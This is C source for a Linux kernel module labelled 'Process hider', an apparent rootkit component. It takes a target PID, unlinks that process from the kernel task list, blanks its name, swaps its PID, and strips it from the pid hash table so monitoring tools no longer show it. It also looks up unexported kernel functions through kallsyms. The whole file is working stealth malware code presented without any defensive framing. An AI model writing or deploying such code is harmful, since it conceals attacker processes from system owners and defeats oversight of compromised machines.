#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h> 
#include <linux/hashtable.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jean 'iansus' Marsault");
MODULE_DESCRIPTION("Process hider");
MODULE_VERSION("1.0");

// From https://github.com/gravit0/changepid/blob/master/module/main.c
static asmlinkage void (*change_pidR)(struct task_struct *task, enum pid_type type, struct pid *pid);
static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace *ns);

static void* find_sym( const char *sym ) {  // find address kernel symbol sym 
	static unsigned long faddr = 0;          // static !!! 
	// ----------- nested functions are a GCC extension --------- 
	int symb_fn( void* data, const char* sym, struct module* mod, unsigned long addr ) { 
		if( 0 == strcmp( (char*)data, sym ) ) { 
			faddr = addr; 
			return 1; 
		} 
		else return 0; 
	}; 
	// -------------------------------------------------------- 
	kallsyms_on_each_symbol( symb_fn, (void*)sym ); 
	return (void*)faddr; 
}


// LKM Arguments
static int target_pid = 0;
module_param(target_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(target_pid, "Target process PID");

static int verb = 0;
module_param(verb, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(verb, "Set to non-0 to make the module verbose");


// LKM Init func
static int __init hideproc_init(void) {

#define NEWPID 65535

	struct list_head* pos = NULL;
	struct task_struct *task = NULL, *elected_task = NULL, *task_prev = NULL, *task_next = NULL;
	struct pid* newpid = NULL;
	char new_comm[16] = {0};
	struct hlist_head **ppid_hash = NULL;
	struct hlist_head *pid_hash = NULL;
	struct hlist_head *phlist = NULL;
	unsigned int *ppidhash_shift = NULL;
	unsigned int pidhash_size = 0;
	unsigned int pidhash_idx = 0;
	struct upid* pupid = NULL;
	struct hlist_node** toremove = NULL;
	unsigned int toremove_cnt = 0, toremove_idx = 0;

	change_pidR = find_sym("change_pid");
	alloc_pidR = find_sym("alloc_pid");

	if (verb) printk(KERN_INFO "Target PID is %d", target_pid);
	list_for_each(pos, &current->tasks) {

		task = list_entry(pos, struct task_struct, tasks); 
		if(task->pid == target_pid) {
			elected_task = task;
		}
	}

	if(elected_task!=NULL) {

		/* Unchain process from task_struct double linked list*/
		if (verb) printk(KERN_INFO "Process id is %d", elected_task->pid);

		task_next = list_entry(elected_task->tasks.next, struct task_struct, tasks);
		task_prev = list_entry(elected_task->tasks.prev, struct task_struct, tasks);
		if(verb) {
			printk(KERN_INFO "Next process is %s", task_next->comm);
			printk(KERN_INFO "Prev process is %s", task_prev->comm);
		}

		memcpy(elected_task->comm, new_comm, 16);
	
		task_prev->tasks.next = elected_task->tasks.next;
		task_next->tasks.prev = elected_task->tasks.prev;

		elected_task->tasks.next = &(elected_task->tasks);
		elected_task->tasks.prev = &(elected_task->tasks);

		
		/* Change PID */
		newpid = alloc_pidR(task_active_pid_ns(elected_task));
		newpid->numbers[0].nr = NEWPID;
		change_pidR(elected_task, PIDTYPE_PID, newpid);
		elected_task->pid = NEWPID;


		/* Remove process from pid hash table */
		ppid_hash = find_sym("pid_hash");
		pid_hash = *ppid_hash;
		ppidhash_shift = find_sym("pidhash_shift");
		pidhash_size = 1 << (*ppidhash_shift);


		for(pidhash_idx=0; pidhash_idx<pidhash_size; pidhash_idx++) {

			phlist = &pid_hash[pidhash_idx];
			if(!hlist_empty(phlist)) {
				
				hlist_for_each_entry(pupid, phlist, pid_chain) {
				
					if(pupid->nr == target_pid || pupid->nr == NEWPID) {

						toremove_cnt++;
					}
				}
			}
		}

		printk(KERN_INFO "Number of elements to remove: %d", toremove_cnt);
		toremove = (struct hlist_node**) kmalloc(toremove_cnt * sizeof(struct hlist_node*), GFP_KERNEL);

		if(!toremove)
			return -ENOMEM;

		for(pidhash_idx=0; pidhash_idx<pidhash_size; pidhash_idx++) {

			phlist = &pid_hash[pidhash_idx];
			if(!hlist_empty(phlist)) {
				
				hlist_for_each_entry(pupid, phlist, pid_chain) {
				
					if(pupid->nr == target_pid || pupid->nr == NEWPID) {
					
						toremove[toremove_idx++] = &(pupid->pid_chain);
					}
				}
			}
		}

		for(toremove_cnt = 0; toremove_cnt<toremove_idx; toremove_cnt++) {

			hlist_del(toremove[toremove_cnt]);
		}

		kfree(toremove);
	}

	return 0;
}


// LKM Exit func
static void __exit hideproc_exit(void) {

	if (verb) printk(KERN_INFO "Goodbye, World!\n");
}


// Register init & exit funcs
module_init(hideproc_init);
module_exit(hideproc_exit);
